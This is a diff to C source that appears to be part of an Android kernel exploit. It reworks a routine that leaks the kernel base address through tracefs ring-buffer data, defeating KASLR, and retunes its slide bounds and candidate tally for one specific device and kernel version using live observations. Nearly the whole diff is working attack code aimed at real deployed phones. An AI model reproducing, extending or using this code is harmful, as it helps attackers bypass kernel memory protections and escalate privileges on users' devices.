@@ -147,6 +147,58 @@ static const uintptr_t slide_p0_offsets[] = {
 };
 #endif
 
+/* V2425A live kernel 6.1.124 KASLR (disassembled __pi_kaslr_early_init):
+ *   offset = 0x1000000000 + (seed & 0x1fffffffff)
+ * → slide ∈ [0x1000000000, 0x11ffffffff] (64 GiB … 192 GiB), 2 MiB-aligned.
+ * The old 0x3f8000 bound (e3q/S24 model) can never match on this device:
+ * the observed live slide is 0x21c7a00000 (~135 GiB). */
+#define SLIDE_KASLR_SLIDE_MIN 0x1000000000ULL
+#define SLIDE_KASLR_SLIDE_MAX 0x11FFFFFFFFULL
+
+#if defined(APP_TRACEFS_SLIDE) && APP_TRACEFS_SLIDE
+static unsigned int slide_tracefs_raw_pages;
+static unsigned int slide_tracefs_raw_bytes;
+static unsigned int slide_tracefs_raw_events;
+static unsigned int slide_tracefs_raw_callers;
+
+/* Flat slot array cannot index slides up to 0x11ffffffff (>>15 ≈ 9M slots),
+ * so tally candidates in a small open-addressing table instead. */
+#define SLIDE_TRACEFS_TALLY_SLOTS 64
+struct slide_tracefs_candidate {
+  uint64_t candidate;
+  unsigned int hits;
+};
+static struct slide_tracefs_candidate slide_tracefs_tally[
+    SLIDE_TRACEFS_TALLY_SLOTS];
+static unsigned int slide_tracefs_tally_overflow;
+static unsigned int slide_tracefs_parse_failures;
+
+static void slide_tracefs_tally_reset(void) {
+  memset(slide_tracefs_tally, 0, sizeof(slide_tracefs_tally));
+  slide_tracefs_tally_overflow = 0;
+}
+
+static void slide_tracefs_tally_add(uint64_t candidate) {
+  size_t hash = (size_t)(((candidate >> 15) * 0x9E3779B97F4A7C15ULL) >>
+                         32) % SLIDE_TRACEFS_TALLY_SLOTS;
+  for (size_t i = 0; i < SLIDE_TRACEFS_TALLY_SLOTS; i++) {
+    size_t idx = (hash + i) & (SLIDE_TRACEFS_TALLY_SLOTS - 1);
+    if (slide_tracefs_tally[idx].hits == 0) {
+      slide_tracefs_tally[idx].candidate = candidate;
+      slide_tracefs_tally[idx].hits = 1;
+      return;
+    }
+    if (slide_tracefs_tally[idx].candidate == candidate) {
+      if (slide_tracefs_tally[idx].hits < 0xffffffffu) {
+        slide_tracefs_tally[idx].hits++;
+      }
+      return;
+    }
+  }
+  slide_tracefs_tally_overflow++;
+}
+#endif
+
 static uint32_t slide_f_wait;
 static uint32_t slide_f_pi_target;
 static uint32_t slide_f_pi_chain;
@@ -196,17 +248,12 @@ int p0_virtual_base_probe;
 #endif
 
 static int slide_commit_stext(uint64_t stext, const char *source);
-static const uint64_t slide_max_offset = 0x3f8000ULL;
+/* V2425A live kernel KASLR range — see SLIDE_KASLR_SLIDE_MAX above. */
+static const uint64_t slide_max_offset = SLIDE_KASLR_SLIDE_MAX;
 
 #if defined(APP_TRACEFS_SLIDE) && APP_TRACEFS_SLIDE
 #define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
-#define SLIDE_TRACEFS_CANDIDATES 128
-static unsigned int slide_tracefs_raw_pages;
-static unsigned int slide_tracefs_raw_bytes;
-static unsigned int slide_tracefs_raw_events;
-static unsigned int slide_tracefs_raw_callers;
-static unsigned int slide_tracefs_parse_failures;
-static unsigned int slide_tracefs_candidate_hits[SLIDE_TRACEFS_CANDIDATES];
+/* Old flat candidate_hits table replaced by slide_tracefs_tally (see above). */
 
 static int slide_tracefs_write(const char *path, const char *value) {
   int fd = open(path, O_WRONLY | O_CLOEXEC);
@@ -393,10 +440,16 @@ static int slide_tracefs_parse_page(const unsigned char *page,
            index < sizeof(link_callers) / sizeof(link_callers[0]); index++) {
         if (caller >= link_callers[index]) {
           uint64_t candidate = caller - link_callers[index];
-          if (candidate <= slide_max_offset &&
+          if (candidate >= SLIDE_KASLR_SLIDE_MIN &&
+              candidate <= slide_max_offset &&
               (candidate & 0x7fffULL) == 0) {
-            size_t slot = (size_t)(candidate >> 15);
-            slide_tracefs_candidate_hits[slot]++;
+            slide_tracefs_tally_add(candidate);
+            if (slide_tracefs_raw_callers < 12) {
+              pr_info("slide tracefs aligned candidate=%016llx "
+                      "caller=%016llx\n",
+                      (unsigned long long)candidate,
+                      (unsigned long long)caller);
+            }
           }
         }
       }
@@ -543,7 +596,28 @@ static int slide_tracefs_leak_kernel_base(void) {
     goto out;
   }
   if (!slide_tracefs_trigger()) {
+    pr_warning("slide tracefs trigger produced no events\n");
     goto out;
+  }
+  /* Live-observed on V2425A: worker_thread callers appear at ~1k/s while
+   * tracing is on, but a zero-length window can harvest zero records.
+   * Let the ring buffer settle before stopping the tracer. */
+  {
+    const char *settle_env = getenv("SLIDE_TRACEFS_SETTLE_MS");
+    long settle_ms = 250;
+    if (settle_env && *settle_env) {
+      char *end = NULL;
+      errno = 0;
+      long parsed = strtol(settle_env, &end, 0);
+      if (!errno && end != settle_env && !*end && parsed >= 0 &&
+          parsed <= 10000) {
+        settle_ms = parsed;
+      }
+    }
+    pr_info("slide tracefs settle ms=%ld\n", settle_ms);
+    if (settle_ms > 0) {
+      usleep((useconds_t)settle_ms * 1000);
+    }
   }
   if (!slide_tracefs_write(tracing_on, "0") ||
       !slide_tracefs_write(event_enable, "0")) {
@@ -562,8 +636,7 @@ static int slide_tracefs_leak_kernel_base(void) {
   slide_tracefs_raw_events = 0;
   slide_tracefs_raw_callers = 0;
   slide_tracefs_parse_failures = 0;
-  memset(slide_tracefs_candidate_hits, 0,
-         sizeof(slide_tracefs_candidate_hits));
+  slide_tracefs_tally_reset();
   for (int cpu = 0; cpu < cpu_count; cpu++) {
     char path[128];
     snprintf(path, sizeof(path),
@@ -608,21 +681,24 @@ static int slide_tracefs_leak_kernel_base(void) {
       scan_ok = 0;
     }
   }
-  for (size_t slot = 0; slot < SLIDE_TRACEFS_CANDIDATES; slot++) {
-    if (!slide_tracefs_candidate_hits[slot]) {
+  for (size_t entry = 0; entry < SLIDE_TRACEFS_TALLY_SLOTS; entry++) {
+    if (!slide_tracefs_tally[entry].hits) {
       continue;
     }
-    uintptr_t slot_candidate = slot << 15;
-    pr_info("slide tracefs candidate=%08zx hits=%u\n",
-            slot_candidate, slide_tracefs_candidate_hits[slot]);
-    candidate = slot_candidate;
+    uintptr_t entry_candidate =
+        (uintptr_t)slide_tracefs_tally[entry].candidate;
+    pr_info("slide tracefs candidate=%016zx hits=%u\n",
+            entry_candidate, slide_tracefs_tally[entry].hits);
+    candidate = entry_candidate;
     candidate_count++;
   }
-  pr_info("slide tracefs raw summary pages=%u bytes=%u events=%u callers=%u parse_fail=%u candidates=%d cpu_files=%d\n",
+  pr_info("slide tracefs raw summary pages=%u bytes=%u events=%u callers=%u parse_fail=%u candidates=%d tally_overflow=%u cpu_files=%d\n",
           slide_tracefs_raw_pages, slide_tracefs_raw_bytes,
           slide_tracefs_raw_events, slide_tracefs_raw_callers,
-          slide_tracefs_parse_failures, candidate_count, cpu_files);
-  if (!scan_ok || slide_tracefs_parse_failures || !cpu_files ||
+          slide_tracefs_parse_failures, candidate_count,
+          slide_tracefs_tally_overflow, cpu_files);
+  if (!scan_ok || slide_tracefs_parse_failures ||
+      slide_tracefs_tally_overflow || !cpu_files ||
       candidate_count != 1) {
     pr_warning("slide tracefs candidate gate failed\n");
     goto out;
@@ -2808,10 +2884,14 @@ static int slide_commit_stext(uint64_t stext, const char *source) {
     return 0;
   }
   uint64_t slide = stext - KIMAGE_TEXT_BASE;
-  if (slide > slide_max_offset || (slide & 0x7fffULL) != 0) {
-    pr_warning("slide rejected source=%s stext=%016llx slide=%016llx\n",
+  if (slide < SLIDE_KASLR_SLIDE_MIN || slide > slide_max_offset ||
+      (slide & 0x7fffULL) != 0) {
+    pr_warning("slide rejected source=%s stext=%016llx slide=%016llx "
+               "bounds=[%llx..%llx]\n",
                source, (unsigned long long)stext,
-               (unsigned long long)slide);
+               (unsigned long long)slide,
+               (unsigned long long)SLIDE_KASLR_SLIDE_MIN,
+               (unsigned long long)slide_max_offset);
     return 0;
   }
   if (strcmp(source, "pselect") == 0 && slide != slide_p0_offset) {
